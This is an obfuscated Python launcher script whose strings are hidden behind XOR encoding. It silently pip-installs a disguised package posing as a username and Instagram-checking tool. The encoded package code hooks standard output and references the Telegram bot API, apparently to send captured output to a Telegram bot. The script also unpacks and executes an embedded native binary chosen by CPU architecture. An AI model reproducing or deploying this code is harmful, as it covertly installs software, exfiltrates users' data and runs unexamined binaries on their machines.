D=(lambda x,y:''.join(chr(A^x)for A in y))(7,[])
C=chr
L=(lambda O0OOOOO0OO00OOO00,O00OO000O00O00O0O:D.join(C(A^O0OOOOO0OO00OOO00)for A in O00OO000O00O00O0O))(74,[33,59,38])
H=(lambda OO000OO00OO0OO0O0,OOOO0O000000O00OO:D.join(C(A^OO000OO00OO0OO0O0)for A in OOOO0O000000O00OO))(112,[7])
I=open
J=print
A=(lambda O00O0O0O0O00O0OOO,OOO0OOOOOOOO00OO0:D.join(C(A^O00O0O0O0O00O0OOO)for A in OOO0OOOOOOOO00OO0))(73,[])
B=C
import zipfile as M,os as F,shutil as N,tempfile as O,sys as G,platform as P,os as E,subprocess as Q,sys,tempfile as R,importlib.util
K=L
S=(lambda O0000OOOOO0O00O0O,OO0O0OO0OOO0OO000:D.join(C(A^O0000OOOOO0O00O0O)for A in OO0O0OO0OOO0OO000))(173,[198,220,193,200,202,202])
T=(lambda OOO0OOOOOOO0O00OO,O00OOO0OOO00OOO0O:D.join(C(A^OOO0OOOOOOO0O00OO)for A in O00OOO0OOO00OOO0O))(189,[219,207,210,208,147,206,201,216,212,211,157,212,208,205,210,207,201,157,207,216,205,207,145,209,212,206,201,145,210,205,216,211,145,206,201,217,200,210,201,145,206,201,217,210,200,201,145,219,220,214,216,226,216,197,212,201,145,219,220,214,216,226,210,206,226,216,197,212,201,183,216,197,212,201,128,219,220,214,216,226,216,197,212,201,183,226,216,197,212,201,128,219,220,214,216,226,210,206,226,216,197,212,201,183])
U=(lambda O00OO0OO00000OO00,OOOOOOOO0OOO0O000:D.join(C(A^O00OO0OO00000OO00)for A in OOOOOOOO0OOO0O000))(33,[102,28,6,71,77,84,82,73,6,43,103,28,6,86,83,72,85,68,6,43,101,28,6,114,85,69,78,84,85,6,43,98,28,111,78,79,68,43,72,76,81,78,83,85,1,82,88,82,1,64,82,1,96,13,78,82,13,83,68,13,83,68,80,84,68,82,85,82,1,64,82,1,99,13,84,83,77,77,72,67,15,81,64,83,82,68,13,86,68,67,67,83,78,86,82,68,83,1,64,82,1,105,43,81,83,72,79,85,9,6,101,100,98,110,101,100,1,99,120,1,114,117,100,104,111,1,93,1,97,115,100,107,100,115,106,6,8,43,83,68,81,83,28,77,64,76,67,69,64,11,96,27,71,3,90,96,92,3,43,77,72,82,85,28,77,64,76,67,69,64,11,96,27,71,3,90,96,92,3,43,69,68,71,1,78,81,68,79,9,85,68,89,85,8,27,43,40,99,28,6,73,85,85,81,82,27,14,14,85,15,76,68,14,6,26,96,28,85,68,89,85,43,40,72,71,1,99,1,72,79,1,96,1,78,83,1,96,15,82,81,77,72,85,9,8,122,17,124,27,101,28,96,15,82,81,77,72,85,9,99,8,122,16,124,15,82,81,77,72,85,9,8,122,17,124,72,71,1,99,1,72,79,1,96,1,68,77,82,68,1,96,15,82,81,77,72,85,9,8,122,17,124,26,98,28,96,15,83,68,81,77,64,66,68,9,101,13,6,115,100,107,100,115,106,6,8,26,105,15,78,81,68,79,9,98,8,26,83,68,85,84,83,79,1,98,43,40,83,68,85,84,83,79,1,96,43,69,68,71,1,104,9,85,68,89,85,8,27,83,68,85,84,83,79,1,83,68,15,82,84,67,9,6,97,125,86,10,6,13,6,97,115,100,107,100,115,106,6,13,85,68,89,85,8,43,107,28,85,88,81,68,9,101,13,9,8,13,90,103,27,77,64,76,67,69,64,1,82,68,77,71,13,85,68,89,85,27,96,15,126,126,82,85,69,78,84,85,126,126,15,86,83,72,85,68,9,104,9,85,68,89,85,8,8,13,102,27,77,64,76,67,69,64,1,82,68,77,71,27,96,15,126,126,82,85,69,78,84,85,126,126,15,71,77,84,82,73,9,8,92,8,9,8,43,96,15,82,85,69,78,84,85,28,107,43,110,28,85,88,81,68,9,101,13,9,8,13,90,103,27,77,64,76,67,69,64,1,82,68,77,71,13,85,68,89,85,27,96,15,82,85,69,78,84,85,15,86,83,72,85,68,9,85,68,89,85,8,13,102,27,77,64,76,67,69,64,1,82,68,77,71,27,96,15,82,85,69,78,84,85,15,71,77,84,82,73,9,8,92,8,9,8,43,69,68,71,1,113,9,11,96,13,11,11,99,8,27,17,43,69,68,71,1,112,9,11,96,13,11,11,99,8,27,17,43,106,28,99,15,70,68,85,43,109,28,99,15,81,78,82,85,43,69,68,71,1,100,9,84,83,77,13,69,64,85,64,28,98,8,27,43,40,100,28,6,101,100,98,110,101,100,1,99,120,1,97,115,100,107,100,115,106,1,8195,1,6,26,101,28,6,7,85,68,89,85,28,6,26,98,28,6,85,68,89,85,6,26,99,28,69,64,85,64,26,96,28,84,83,77,43,40,72,71,6,64,81,72,15,85,68,77,68,70,83,64,76,15,78,83,70,6,72,79,1,96,1,64,79,69,6,82,68,79,69,108,68,82,82,64,70,68,6,72,79,1,96,27,43,40,40,72,71,1,99,1,64,79,69,1,72,82,72,79,82,85,64,79,66,68,9,99,13,69,72,66,85,8,64,79,69,1,98,1,72,79,1,99,27,99,122,98,124,28,100,10,99,122,98,124,43,40,40,68,77,72,71,1,101,1,72,79,1,96,27,103,13,102,28,96,15,82,81,77,72,85,9,101,13,16,8,26,105,28,84,83,77,77,72,67,15,81,64,83,82,68,15,84,79,80,84,78,85,68,9,102,8,26,104,28,100,10,105,15,82,85,83,72,81,9,8,26,107,28,84,83,77,77,72,67,15,81,64,83,82,68,15,80,84,78,85,68,9,104,8,26,96,28,103,10,101,10,107,43,40,83,68,85,84,83,79,1,96,13,99,43,69,68,71,1,108,9,84,83,77,13,11,99,13,11,11,98,8,27,96,28,84,83,77,26,96,13,101,28,100,9,96,8,26,83,68,85,84,83,79,1,106,9,96,13,11,99,13,11,11,98,8,43,69,68,71,1,111,9,84,83,77,13,11,102,13,11,11,101,8,27,43,40,103,28,6,69,64,85,64,6,26,99,28,84,83,77,26,96,28,101,15,70,68,85,9,103,13,98,8,26,99,13,96,28,100,9,99,13,96,8,43,40,72,71,1,96,1,72,82,1,79,78,85,1,98,27,101,122,103,124,28,96,43,40,83,68,85,84,83,79,1,109,9,99,13,11,102,13,11,11,101,8,43,99,15,70,68,85,28,108,43,99,15,81,78,82,85,28,111,43])
V=(lambda OO0000000O0O0000O,OO00O0OO0O000OOO0:D.join(C(A^OO0000000O0O0000O)for A in OO00O0OO0O000OOO0))(61,[91,79,82,80,29,78,88,73,72,77,73,82,82,81,78,29,84,80,77,82,79,73,29,78,88,73,72,77,17,29,91,84,83,89,98,77,92,94,86,92,90,88,78,55,55,78,88,73,72,77,21,55,29,29,29,29,83,92,80,88,0,31,86,76,81,31,17,29,29,30,29,10040,29,104,83,84,76,72,88,29,77,92,94,86,92,90,88,29,83,92,80,88,55,29,29,29,29,75,88,79,78,84,82,83,0,31,12,19,15,19,12,15,31,17,29,29,30,29,110,73,92,79,73,29,74,84,73,85,29,75,88,79,78,84,82,83,29,13,19,12,19,13,55,29,29,29,29,77,92,94,86,92,90,88,78,0,91,84,83,89,98,77,92,94,86,92,90,88,78,21,20,17,55,29,29,29,29,84,83,78,73,92,81,81,98,79,88,76,72,84,79,88,78,0,102,31,79,88,76,72,88,78,73,78,31,96,17,29,29,30,29,113,84,78,73,29,89,88,77,88,83,89,88,83,94,84,88,78,55,29,29,29,29,92,72,73,85,82,79,0,31,110,105,120,116,115,31,17,55,29,29,29,29,92,72,73,85,82,79,98,88,80,92,84,81,0,31,89,88,75,84,81,78,73,88,84,83,78,85,82,79,73,78,125,90,80,92,84,81,19,94,82,80,31,17,55,29,29,29,29,89,88,78,94,79,84,77,73,84,82,83,0,31,124,29,109,68,73,85,82,83,29,77,92,94,86,92,90,88,29,91,82,79,29,72,78,88,79,29,84,83,91,82,17,29,72,78,88,79,83,92,80,88,29,90,88,83,88,79,92,73,84,82,83,17,29,116,83,78,73,92,90,79,92,80,29,94,85,88,94,86,84,83,90,17,29,92,83,89,29,88,80,92,84,81,29,75,92,81,84,89,92,73,84,82,83,19,31,17,55,29,29,29,29,81,82,83,90,98,89,88,78,94,79,84,77,73,84,82,83,0,82,77,88,83,21,31,111,120,124,121,112,120,19,80,89,31,20,19,79,88,92,89,21,20,17,55,29,29,29,29,81,82,83,90,98,89,88,78,94,79,84,77,73,84,82,83,98,94,82,83,73,88,83,73,98,73,68,77,88,0,31,73,88,69,73,18,80,92,79,86,89,82,74,83,31,17,55,29,29,29,29,72,79,81,0,31,85,73,73,77,78,7,18,18,90,84,73,85,72,95,19,94,82,80,18,68,82,72,79,72,78,88,79,83,92,80,88,18,78,73,88,84,83,81,72,79,86,78,31,17,29,29,30,29,126,85,92,83,90,88,29,73,85,84,78,29,73,82,29,68,82,72,79,29,92,94,73,72,92,81,29,122,84,73,117,72,95,29,79,88,77,82,55,29,29,29,29,94,81,92,78,78,84,91,84,88,79,78,0,102,55,29,29,29,29,29,29,29,29,31,109,79,82,90,79,92,80,80,84,83,90,29,113,92,83,90,72,92,90,88,29,7,7,29,109,68,73,85,82,83,29,7,7,29,14,31,17,55,29,29,29,29,29,29,29,29,31,113,84,94,88,83,78,88,29,7,7,29,114,110,116,29,124,77,77,79,82,75,88,89,29,7,7,29,112,116,105,29,113,84,94,88,83,78,88,31,17,55,29,29,29,29,29,29,29,29,31,114,77,88,79,92,73,84,83,90,29,110,68,78,73,88,80,29,7,7,29,114,110,29,116,83,89,88,77,88,83,89,88,83,73,31,17,55,29,29,29,29,96,17,55,29,29,29,29,77,68,73,85,82,83,98,79,88,76,72,84,79,88,78,0,26,3,0,14,19,11,26,17,55,20,55])
def W(OO00OOO0O000000O0):
	F=(lambda OO0O00OOOO00O0OOO,OOOOOO0O0O00O0000:D.join(C(A^OO0O00OOOO00O0OOO)for A in OOOOOO0O0O00O0000))(150,[227,226,240,187,174]);B=OO00OOO0O000000O0;E.makedirs(E.path.join(B,K),exist_ok=True);E.makedirs(E.path.join(B,S),exist_ok=True)
	with I(E.path.join(B,K,(lambda OO0O00O0OOO00OO0O,OO00OOOOOOOOO0O00:D.join(C(A^OO0O00O0OOO00OO0O)for A in OO00OOOOOOOOO0O00))(30,[65,65,119,112,119,106,65,65,48,110,103])),H,encoding=F)as A:A.write(T)
	with I(E.path.join(B,K,(lambda OOO0O000OO0O000OO,OO0O0OOO0000OOO0O:D.join(C(A^OOO0O000OO0O000OO)for A in OO0O0OOO0000OOO0O))(115,[0,7,22,26,29,93,3,10])),H,encoding=F)as A:A.write(U)
	with I(E.path.join(B,(lambda OOOO0O0OOO000000O,OO0OOO0OOO0000000:D.join(C(A^OOOO0O0OOO000000O)for A in OO0OOO0OOO0000000))(109,[30,8,25,24,29,67,29,20])),H,encoding=F)as A:A.write(V)
	with I(E.path.join(B,(lambda OOO0O00OO0O00O00O,OO0OO0OO00000OOOO:D.join(C(A^OOO0O00OO0O00O00O)for A in OO0OO0OO00000OOOO))(9,[91,76,72,77,68,76,39,100,109])),H,encoding=F)as A:A.write((lambda OOO000O000OOO0O0O,OO0OOOO0OOOOO0000:D.join(C(A^OOO000O000OOO0O0O)for A in OO0OOOO0OOOOO0000))(107,[72,75,0,26,7,75,59,10,8,0,10,12,14,97,63,3,2,24,75,2,24,75,10,75,59,18,31,3,4,5,75,27,10,8,0,10,12,14,75,13,4,25,75,29,10,25,2,4,30,24,75,30,31,2,7,2,31,2,14,24,75,9,18,75,56,63,46,34,37,69]))
def X(O0O0000O000OOO0O0):
	with I(E.devnull,H)as A:Q.run([(lambda OO0O0OOO0O000O000,O00000000O0OO00O0:D.join(C(A^OO0O0OOO0O000O000)for A in O00000000O0OO00O0))(253,[141,148,141]),(lambda OO000000O0OOO0000,OO0O0O00OOO0OO000:D.join(C(A^OO000000O0OOO0000)for A in OO0O0O00OOO0OO000))(88,[49,54,43,44,57,52,52]),O0O0000O000OOO0O0],stdout=A,stderr=A)
def Y(OO00000000OOO0OO0):A=importlib.util.find_spec(OO00000000OOO0OO0);return A is not None
def Z():
	B=L
	if not Y(B):
		with R.TemporaryDirectory()as A:W(A);X(A)
if __name__==(lambda OO0000O0OO0OOO0O0,O00O00O0000OO000O:D.join(C(A^OO0000O0OO0OOO0O0)for A in O00O00O0000OO000O))(161,[254,254,204,192,200,207,254,254]):Z()
def a():
	L=F.path.dirname(F.path.abspath(G.argv[0]));H=O.mkdtemp()
	try:
		Q=F.path.abspath(G.argv[0])
		with M.ZipFile(Q,(lambda O000OOO0OO0O000OO,OOOO0OOO0OOOO0000:D.join(C(A^O000OOO0OO0O000OO)for A in OOOO0OOO0OOOO0000))(144,[226]))as R:R.extractall(H)
		E=P.machine();K={(lambda O0OO000OOO000O00O:A.join(B(A^151)for A in O0OO000OOO000O00O))([246,229,250,225,160,251]):(lambda OOOOOO00000OO0O0O:A.join(B(A^11)for A in OOOOOO00000OO0O0O))([106,121,102,110,106,105,98,38,125,60,106]),(lambda OO0000O00000OOO0O:A.join(B(A^69)for A in OO0000O00000OOO0O))([36,55,40,51,125,41]):(lambda OOOOOOO00OO0OOOOO:A.join(B(A^179)for A in OOOOOOO00OO0OOOOO))([210,193,222,214,210,209,218,158,197,132,210]),(lambda OO0O0OOOOOOOO0O0O:A.join(B(A^134)for A in OO0O0OOOOOOOO0O0O))([231,244,235]):(lambda O000OO00OO0O00OO0:A.join(B(A^177)for A in O000OO00OO0O00OO0))([208,195,220,212,208,211,216,156,199,134,208]),(lambda O0OOO00O0O000O0OO:A.join(B(A^54)for A in O0OOO00O0O000O0OO))([87,87,68,85,94,0,2]):(lambda OOOO00OO000O0OO00:A.join(B(A^4)for A in OOOO00OO000O0OO00))([101,118,105,50,48,41,114,60,101]),(lambda OOO0OO0000O0OOO0O:A.join(B(A^130)for A in OOO0OO0000O0OOO0O))([227,240,239,180,182]):(lambda O0O0O0O0OO0O000OO:A.join(B(A^199)for A in O0O0O0O0OO0O000OO))([166,181,170,241,243,234,177,255,166]),(lambda OOO00OO000OO000O0:A.join(B(A^189)for A in OOO00OO000OO000O0))([197,133,139]):(lambda O00000000O00O00O0:A.join(B(A^200)for A in O00000000O00O00O0))([176,240,254]),(lambda OOOOOO0OO0OOOOOO0:A.join(B(A^108)for A in OOOOOO0OO0OOOOOO0))([5,90,84,90]):(lambda O00OOO00O000O00O0:A.join(B(A^39)for A in O00OOO00O000O00O0))([95,31,17]),(lambda OOOOO0OOOO00000O0:A.join(B(A^173)for A in OOOOO0OOOO00000O0))([213,149,155,242,155,153]):(lambda O0OOOO00O00OOO000:A.join(B(A^71)for A in O0OOOO00O00OOO000))([63,127,113,24,113,115]),(lambda OOO00OOOO0000OO00:A.join(B(A^208)for A in OOO00OOOO0000OO00))([177,189,180,230,228]):(lambda O0OO0O0O0OO0OO00O:A.join(B(A^176)for A in O0OO0O0O0OO0OO00O))([200,136,134,239,134,132])}
		if E not in K:J((lambda O000O000O0000000O:A.join(B(A^171)for A in O000O000O0000000O))([254,197,216,222,219,219,196,217,223,206,207,139,202,217,200,195,194,223,206,200,223,222,217,206,145,139,142,216])%E);G.exit(1)
		S=K[E];I=F.path.join(H,S)
		if not F.path.exists(I):J((lambda O0000OO0OO0OOO0OO:A.join(B(A^97)for A in O0000OO0OO0OOO0OO))([52,15,18,20,17,17,14,19,21,4,5,65,0,19,2,9,8,21,4,2,21,20,19,4,91,65,68,18])%E);G.exit(1)
		F.chmod(I,493);F.chdir(L);T=(lambda OO0O0O00O0O00OO0O:A.join(B(A^128)for A in OO0O0O00O0O00OO0O))([229,248,240,239,242,244,160,204,196,223,204,201,194,210,193,210,217,223,208,193,212,200,189,164,204,196,223,204,201,194,210,193,210,217,223,208,193,212,200,186,165,243,175,236,233,226,160,166,166,160,229,248,240,239,242,244,160,208,217,212,200,207,206,200,207,205,197,189,165,243,160,166,166,160,229,248,240,239,242,244,160,208,217,212,200,207,206,223,197,216,197,195,213,212,193,194,204,197,189,165,243,160,166,166,160,165,243,160,165,243])%(G.prefix,G.prefix,G.executable,I,(lambda OOOOOOOO0OOO00000,O00O0OO000OO00O00:D.join(C(A^OOOOOOOO0OOO00000)for A in O00O0OO000OO00O00))(34,[2]).join(G.argv[1:]));F.system(T)
	except M.BadZipFile:J((lambda O00O00OOO000O0O00:A.join(B(A^206)for A in O00O00OOO000O0O00))([139,188,188,161,188,244,238,154,166,171,238,180,167,190,238,168,167,162,171,238,167,189,238,173,161,188,188,187,190,186,171,170,238,161,188,238,160,161,186,238,175,238,180,167,190,238,168,167,162,171,224]))
	except Exception as U:J((lambda OOOO000OOOO0O0O00:A.join(B(A^195)for A in OOOO000OOOO0O0O00))([130,173,227,166,177,177,172,177,227,172,160,160,182,177,177,166,167,249,227,230,176])%U)
	finally:N.rmtree(H)
if __name__==(lambda OO0O0OOOOOOO0O0O0:A.join(B(A^30)for A in OO0O0OOOOOOO0O0O0))([65,65,115,127,119,112,65,65]):a()
